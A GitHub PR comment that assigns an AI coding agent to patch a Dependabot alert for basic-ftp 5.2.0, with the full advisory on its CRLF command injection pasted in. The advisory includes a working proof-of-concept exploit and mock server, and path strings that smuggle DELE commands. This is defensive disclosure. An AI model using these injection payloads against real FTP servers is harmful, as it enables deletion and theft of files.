@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** basic-ftp (npm)
- **Severity:** HIGH
- **Vulnerable versions:** = 5.2.0
- **Patched version:** 5.2.1
- **CVE:** N/A
- **GHSA:** GHSA-chqc-8p9q-pq6q
- **Manifest:** pnpm-lock.yaml

**Summary:**
basic-ftp has FTP Command Injection via CRLF

**Description:**
## Summary

`basic-ftp` version `5.2.0` allows FTP command injection via CRLF sequences (`\r\n`) in file path parameters passed to high-level path APIs such as `cd()`, `remove()`, `rename()`, `uploadFrom()`, `downloadTo()`, `list()`, and `removeDir()`. The library's `protectWhitespace()` helper only handles leading spaces and returns other paths unchanged, while `FtpContext.send()` writes the resulting command string directly to the control socket with `\r\n` appended. This lets attacker-controlled path strings split one intended FTP command into multiple commands.

## Affected product

| Product | Affected versions | Fixed version |
| --- | --- | --- |
| basic-ftp (npm) | 5.2.0 (confirmed) | no fix available as of 2026-04-04 |

## Vulnerability details

- CWE: `CWE-93` - Improper Neutralization of CRLF Sequences ('CRLF Injection')
- CVSS 3.1: `8.6` (`High`)
- Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L`
- Affected component: `dist/Client.js`, all path-handling methods via `protectWhitespace()` and `send()`

The vulnerability exists because of two interacting code patterns:

**1. Inadequate path sanitization in `protectWhitespace()` (line 677):**

```javascript
async protectWhitespace(path) {
    if (!path.startsWith(" ")) {
        return path;  // No sanitization of \r\n characters
    }
    const pwd = await this.pwd();
    const absolutePathPrefix = pwd.endsWith("/") ? pwd : pwd + "/";
    return absolutePathPrefix + path;
}
```

This function only handles leading whitespace. It does not strip or reject `\r` (0x0D) or `\n` (0x0A) characters anywhere in the path string.

**2. Direct socket write in `send()` (FtpContext.js line 177):**

```javascript
send(command) {
    this._socket.write(command + "\r\n", this.encoding);
}
```

The `send()` method appends `\r\n` to the command and writes directly to the TCP socket. If the command string already contains `\r\n` sequences (from unsanitized path input), the FTP server interprets them as command delimiters, causing the single intended command to be split into multiple commands.

**Affected methods** (all call `protectWhitespace()` → `send()`):
- `cd(path)` → `CWD ${path}`
- `remove(path)` → `DELE ${path}`
- `list(path)` → `LIST ${path}`
- `downloadTo(localPath, remotePath)` → `RETR ${remotePath}`
- `uploadFrom(localPath, remotePath)` → `STOR ${remotePath}`
- `rename(srcPath, destPath)` → `RNFR ${srcPath}` / `RNTO ${destPath}`
- `removeDir(path)` → `RMD ${path}`

## Technical impact

An attacker who controls file path parameters can inject arbitrary FTP protocol commands, enabling:

1. **Arbitrary file deletion**: Inject `DELE /critical-file` to delete files on the FTP server
2. **Directory manipulation**: Inject `MKD` or `RMD` commands to create/remove directories
3. **File exfiltration**: Inject `RETR` commands to trigger downloads of unintended files
4. **Server command execution**: On FTP servers supporting `SITE EXEC`, inject system commands
5. **Session hijacking**: Inject `USER`/`PASS` commands to re-authenticate as a different user
6. **Service disruption**: Inject `QUIT` to terminate the FTP session unexpectedly

The attack is realistic in applications that accept user input for FTP file paths — for example, web applications that allow users to specify files to download from or upload to an FTP server.

## Proof of concept

**Prerequisites:**

```bash
mkdir basic-ftp-poc && cd basic-ftp-poc
npm init -y
npm install basic-ftp@5.2.0
```

**Mock FTP server (ftp-server-mock.js):**

```javascript
const net = require('net');
const server = net.createServer(conn => {
  console.log('[+] Client connected');
  conn.write('220 Mock FTP\r\n');
  let buffer = '';
  conn.on('data', data => {
    buffer += data.toString();
    const lines = buffer.split('\r\n');
    buffer = lines.pop();
    for (const line of lines) {
      if (!line) continue;
      console.log('[CMD] ' + JSON.stringify(line));
      if (line.startsWith('USER')) conn.write('331 OK\r\n');
      else if (line.startsWith('PASS')) conn.write('230 Logged in\r\n');
      else if (line.startsWith('FEAT')) conn.write('211 End\r\n');
      else if (line.startsWith('TYPE')) conn.write('200 OK\r\n');
      else if (line.startsWith('PWD'))  conn.write('257 "/"\r\n');
      else if (line.startsWith('OPTS')) conn.write('200 OK\r\n');
      else if (line.startsWith('STRU')) conn.write('200 OK\r\n');
      else if (line.startsWith('CWD'))  conn.write('250 OK\r\n');
      else if (line.startsWith('DELE')) conn.write('250 Deleted\r\n');
      else if (line.startsWith('QUIT')) { conn.write('221 Bye\r\n'); conn.end(); }
      else conn.write('200 OK\r\n');
    }
  });
});
server.listen(2121, () => console.log('[*] Mock FTP on port 2121'));
```

**Exploit (poc.js):**

```javascript
const ftp = require('basic-ftp');

async function exploit() {
  const client = new ftp.Client();
  client.ftp.verbose = true;
  try {
    await client.access({
      host: '127.0.0.1',
      port: 2121,
      user: 'anonymous',
      password: 'anonymous'
    });

    // Attack 1: Inject DELE command via cd()
    // Intended: CWD harmless.txt
    // Actual:   CWD harmless.txt\r\nDELE /important-file.txt
    const maliciousPath = "harmless.txt\r\nDELE /important-file.txt";
    console.log('\n=== Attack 1: DELE injection via cd() ===');
    try { await client.cd(maliciousPath); } catch(e) {}

    // Attack 2: Double DELE via remove()
    const maliciousPath2 = "decoy.txt\r\nDELE /secret-data.txt";
    console.log('\n=== Attack 2: DELE injection via remove() ===');
    try { await client.remove(maliciousPath2); } catch(e) {}

  } finally {
    client.close();
  }
}
exploit();
```

**Running the PoC:**

```bash
# Terminal 1: Start mock FTP server
node ftp-server-mock.js

# Terminal 2: Run exploit
node poc.js
```

**Expected output on mock server:**

```
"OPTS UTF8 ON"
"USER anonymous"
"PASS anonymous"
"FEAT"
"TYPE I"
"STRU F"
"OPTS UTF8 ON"
"CWD harmless.txt"
"DELE /important-file.txt"   <-- injected from cd()
"DELE decoy.txt"
"DELE /secret-data.txt"      <-- injected from remove()
"QUIT"
```

This command trace was reproduced against the published `basic-ftp@5.2.0`
package on Linux with a local mock FTP server. The injected `DELE` commands are
received as distinct FTP commands, confirming that CRLF inside path parameters
is not neutralized before socket write.

## Mitigation

**Immediate workaround**: Sanitize all path inputs before passing them to basic-ftp:

```javascript
function sanitizeFtpPath(path) {
  if (/[\r\n]/.test(path)) {
    throw new Error('Invalid FTP path: contains control characters');
  }
  return path;
}

// Usage
await client.cd(sanitizeFtpPath(userInput));
```

**Recommended fix for basic-ftp**: The `protectWhitespace()` function (or a new validation layer) should reject or strip `\r` and `\n` characters from all path inputs:

```javascript
async protectWhitespace(path) {
    // Reject CRLF injection attempts
    if (/[\r\n\0]/.test(path)) {
        throw new Error('Invalid path: contains control characters');
    }
    if (!path.startsWith(" ")) {
        return path;
    }
    const pwd = await this.pwd();
    const absolutePathPrefix = pwd.endsWith("/") ? pwd : pwd + "/";
    return absolutePathPrefix + path;
}
```

## References

- [npm package: basic-ftp](https://www.npmjs.com/package/basic-ftp)
- [GitHub repository](https://github.com/patrickjuchli/basic-ftp)
- [Vulnerable source: Client.js protectWhitespace()](https://github.com/patrickjuchli/basic-ftp/blob/master/src/Client.ts)
- [Vulnerable source: FtpContext.js send()](https://github.com/patrickjuchli/basic-ftp/blob/master/src/FtpContext.ts)
- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)
- [OWASP: CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/1412)
